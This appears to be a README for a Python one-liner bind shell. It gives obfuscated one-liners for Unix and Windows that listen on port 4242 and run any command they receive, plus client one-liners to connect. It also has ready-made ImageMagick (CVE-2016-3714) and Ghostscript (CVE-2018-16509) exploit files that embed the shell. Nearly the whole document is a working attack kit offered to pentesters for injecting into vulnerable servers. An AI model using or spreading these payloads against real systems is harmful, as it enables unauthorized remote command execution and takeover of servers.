# Python one-liner bind shell
A python bind shell single line code for both Unix and Windows. This special useful for pentester when they found an RCE in a python server but they can't create a new file, special when you found an Imagemagick or Ghostscript RCE, inject this code to the payload and let see does the server vulnerable. This also helps adminstrator to create a bind shell to the server with just a single code, very simple.  

**Note: Shell supports 'cd' command.**


# Payloads:
## The host command (to create a bind shell):
### Unix:

```
python -c "(lambda __g, __y, __contextlib: [[[[(s.bind(('0.0.0.0', 4242)), (s.listen(5), [(lambda __after: [[[(lambda __after: [__after() for __g['u'] in [('system32')]][0] if ctypes.windll.shell32.IsUserAnAdmin() else __after())(lambda: [(c.send('%s(c) Microsoft Corporation. All rights reserved.%s'(v, f)), [__after() for __g['r'] in [('Command can not be recognized\n')]][0])[1] for __g['f'] in [(('\nShell\\%s> ' % u))]][0]) for __g['u'] in [(os.getlogin().encode())]][0] for __g['v'] in [(subprocess.check_output('ver', stderr=subprocess.STDOUT, shell=True).replace('\n', ''))]][0] for __g['ctypes'] in [(__import__('ctypes', __g, __g))]][0] if (os.name == 'nt') else [[(lambda __after: [__after() for __g['e'] in [('#')]][0] if (u == 'root') else __after())(lambda: [(c.send(f), [__after() for __g['r'] in [('-sh: command not found\n')]][0])[1] for __g['f'] in [(('%s@%s:%s ' % (u, socket.gethostname().encode(), e)))]][0]) for __g['e'] in [('$')]][0] for __g['u'] in [(subprocess.check_output('whoami', stderr=subprocess.STDOUT, shell=True).replace('\n', ''))]][0])(lambda: (lambda __after: __y(lambda __this: lambda: (lambda __break: [(lambda __after: __break() if (d == 'exit') else __after())(lambda: (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: (c.send(('%s%s' % (b, f))), __this())[1])][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and ([True for __out[0] in [([lambda after: after() for __g['b'] in [(r)]][0])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [([(lambda __after: (os.chdir(d[3:]), __after())[1] if (d[:2] == 'cd') else __after())(lambda: (lambda __after: __after())) for __g['b'] in [(subprocess.check_output(d, stderr=subprocess.STDOUT, shell=True))]][0])]][0]})())))([None])) for __g['d'] in [(c.recv(1024).decode().replace('\n', ''))]][0])(__after) if 1 else __after())())(lambda: None)) for (__g['c'], __g['a']) in [(s.accept())]][0])[1])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0])(globals(), (lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), __import__('contextlib', level=0))"
```

### Windows:

```
py -c "(lambda __g, __y, __contextlib: [[[[(s.bind(('0.0.0.0', 4242)), (s.listen(5), [(lambda __after: [[[(lambda __after: [__after() for __g['u'] in [('system32')]][0] if ctypes.windll.shell32.IsUserAnAdmin() else __after())(lambda: [(c.send('%s(c) Microsoft Corporation. All rights reserved.%s'(v, f)), [__after() for __g['r'] in [('Command can not be recognized\n')]][0])[1] for __g['f'] in [(('\nShell\\%s> ' % u))]][0]) for __g['u'] in [(os.getlogin().encode())]][0] for __g['v'] in [(subprocess.check_output('ver', stderr=subprocess.STDOUT, shell=True).replace('\n', ''))]][0] for __g['ctypes'] in [(__import__('ctypes', __g, __g))]][0] if (os.name == 'nt') else [[(lambda __after: [__after() for __g['e'] in [('#')]][0] if (u == 'root') else __after())(lambda: [(c.send(f), [__after() for __g['r'] in [('-sh: command not found\n')]][0])[1] for __g['f'] in [(('%s@%s:%s ' % (u, socket.gethostname().encode(), e)))]][0]) for __g['e'] in [('$')]][0] for __g['u'] in [(subprocess.check_output('whoami', stderr=subprocess.STDOUT, shell=True).replace('\n', ''))]][0])(lambda: (lambda __after: __y(lambda __this: lambda: (lambda __break: [(lambda __after: __break() if (d == 'exit') else __after())(lambda: (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: (c.send(('%s%s' % (b, f))), __this())[1])][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and ([True for __out[0] in [([lambda after: after() for __g['b'] in [(r)]][0])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [([(lambda __after: (os.chdir(d[3:]), __after())[1] if (d[:2] == 'cd') else __after())(lambda: (lambda __after: __after())) for __g['b'] in [(subprocess.check_output(d, stderr=subprocess.STDOUT, shell=True))]][0])]][0]})())))([None])) for __g['d'] in [(c.recv(1024).decode().replace('\n', ''))]][0])(__after) if 1 else __after())())(lambda: None)) for (__g['c'], __g['a']) in [(s.accept())]][0])[1])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0])(globals(), (lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), __import__('contextlib', level=0))"
```



## The client command (to connect to the shell):
### Unix:
#### Python 2:

```
python -c "(lambda __g, __y: [[[(s.connect((t, 4242)), (lambda __after: __y(lambda __this: lambda: (lambda __break: [[(s.send(b.encode()), (lambda __after: __break() if (b == 'exit') else __after())(lambda: __this()))[1] for __g['b'] in [(raw_input(d))]][0] for __g['d'] in [(s.recv(2048).decode())]][0])(__after) if 1 else __after())())(lambda: None))[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['t'] in [(raw_input('Host: '))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0])(globals(), (lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))))"
```

#### Python 3:

```
python3 -c "(lambda __g, __y: [[[(s.connect((t, 4242)), (lambda __after: __y(lambda __this: lambda: (lambda __break: [[(s.send(b.encode()), (lambda __after: __break() if (b == 'exit') else __after())(lambda: __this()))[1] for __g['b'] in [(input(d))]][0] for __g['d'] in [(s.recv(2048).decode())]][0])(__after) if 1 else __after())())(lambda: None))[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['t'] in [(input('Host: '))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0])(globals(), (lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))))"
```


### Windows:
#### Python2:

```
py -c "(lambda __g, __y: [[[(s.connect((t, 4242)), (lambda __after: __y(lambda __this: lambda: (lambda __break: [[(s.send(b.encode()), (lambda __after: __break() if (b == 'exit') else __after())(lambda: __this()))[1] for __g['b'] in [(raw_input(d))]][0] for __g['d'] in [(s.recv(2048).decode())]][0])(__after) if 1 else __after())())(lambda: None))[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['t'] in [(raw_input('Host: '))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0])(globals(), (lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))))"
```

#### Python 3:

```
py -c "(lambda __g, __y: [[[(s.connect((t, 4242)), (lambda __after: __y(lambda __this: lambda: (lambda __break: [[(s.send(b.encode()), (lambda __after: __break() if (b == 'exit') else __after())(lambda: __this()))[1] for __g['b'] in [(input(d))]][0] for __g['d'] in [(s.recv(2048).decode())]][0])(__after) if 1 else __after())())(lambda: None))[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['t'] in [(input('Host: '))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0])(globals(), (lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))))"
```


## Simple RCE payloads:
### CVE-2016-3714:

```
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'https://127.0.0.1/x.php?x=`python -c "(lambda __g, __y, __contextlib: [[[[(s.bind(('0.0.0.0', 4242)), (s.listen(5), [(lambda __after: [[[(lambda __after: [__after() for __g['u'] in [('system32')]][0] if ctypes.windll.shell32.IsUserAnAdmin() else __after())(lambda: [(c.send('%s(c) Microsoft Corporation. All rights reserved.%s'(v, f)), [__after() for __g['r'] in [('Command can not be recognized\n')]][0])[1] for __g['f'] in [(('\nShell\\%s> ' % u))]][0]) for __g['u'] in [(os.getlogin().encode())]][0] for __g['v'] in [(subprocess.check_output('ver', stderr=subprocess.STDOUT, shell=True).replace('\n', ''))]][0] for __g['ctypes'] in [(__import__('ctypes', __g, __g))]][0] if (os.name == 'nt') else [[(lambda __after: [__after() for __g['e'] in [('#')]][0] if (u == 'root') else __after())(lambda: [(c.send(f), [__after() for __g['r'] in [('-sh: command not found\n')]][0])[1] for __g['f'] in [(('%s@%s:%s ' % (u, socket.gethostname().encode(), e)))]][0]) for __g['e'] in [('$')]][0] for __g['u'] in [(subprocess.check_output('whoami', stderr=subprocess.STDOUT, shell=True).replace('\n', ''))]][0])(lambda: (lambda __after: __y(lambda __this: lambda: (lambda __break: [(lambda __after: __break() if (d == 'exit') else __after())(lambda: (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: (c.send(('%s%s' % (b, f))), __this())[1])][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and ([True for __out[0] in [([lambda after: after() for __g['b'] in [(r)]][0])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [([(lambda __after: (os.chdir(d[3:]), __after())[1] if (d[:2] == 'cd') else __after())(lambda: (lambda __after: __after())) for __g['b'] in [(subprocess.check_output(d, stderr=subprocess.STDOUT, shell=True))]][0])]][0]})())))([None])) for __g['d'] in [(c.recv(1024).decode().replace('\n', ''))]][0])(__after) if 1 else __after())())(lambda: None)) for (__g['c'], __g['a']) in [(s.accept())]][0])[1])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0])(globals(), (lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), __import__('contextlib', level=0))"`'
pop graphic-context
```

### CVE-2018-16509:

```
%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100

userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%python -c "(lambda __g, __y, __contextlib: [[[[(s.bind(('0.0.0.0', 4242)), (s.listen(5), [(lambda __after: [[[(lambda __after: [__after() for __g['u'] in [('system32')]][0] if ctypes.windll.shell32.IsUserAnAdmin() else __after())(lambda: [(c.send('%s(c) Microsoft Corporation. All rights reserved.%s'(v, f)), [__after() for __g['r'] in [('Command can not be recognized\n')]][0])[1] for __g['f'] in [(('\nShell\\%s> ' % u))]][0]) for __g['u'] in [(os.getlogin().encode())]][0] for __g['v'] in [(subprocess.check_output('ver', stderr=subprocess.STDOUT, shell=True).replace('\n', ''))]][0] for __g['ctypes'] in [(__import__('ctypes', __g, __g))]][0] if (os.name == 'nt') else [[(lambda __after: [__after() for __g['e'] in [('#')]][0] if (u == 'root') else __after())(lambda: [(c.send(f), [__after() for __g['r'] in [('-sh: command not found\n')]][0])[1] for __g['f'] in [(('%s@%s:%s ' % (u, socket.gethostname().encode(), e)))]][0]) for __g['e'] in [('$')]][0] for __g['u'] in [(subprocess.check_output('whoami', stderr=subprocess.STDOUT, shell=True).replace('\n', ''))]][0])(lambda: (lambda __after: __y(lambda __this: lambda: (lambda __break: [(lambda __after: __break() if (d == 'exit') else __after())(lambda: (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: (c.send(('%s%s' % (b, f))), __this())[1])][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and ([True for __out[0] in [([lambda after: after() for __g['b'] in [(r)]][0])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [([(lambda __after: (os.chdir(d[3:]), __after())[1] if (d[:2] == 'cd') else __after())(lambda: (lambda __after: __after())) for __g['b'] in [(subprocess.check_output(d, stderr=subprocess.STDOUT, shell=True))]][0])]][0]})())))([None])) for __g['d'] in [(c.recv(1024).decode().replace('\n', ''))]][0])(__after) if 1 else __after())())(lambda: None)) for (__g['c'], __g['a']) in [(s.accept())]][0])[1])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0])(globals(), (lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), __import__('contextlib', level=0))") currentdevice putdeviceprops
```
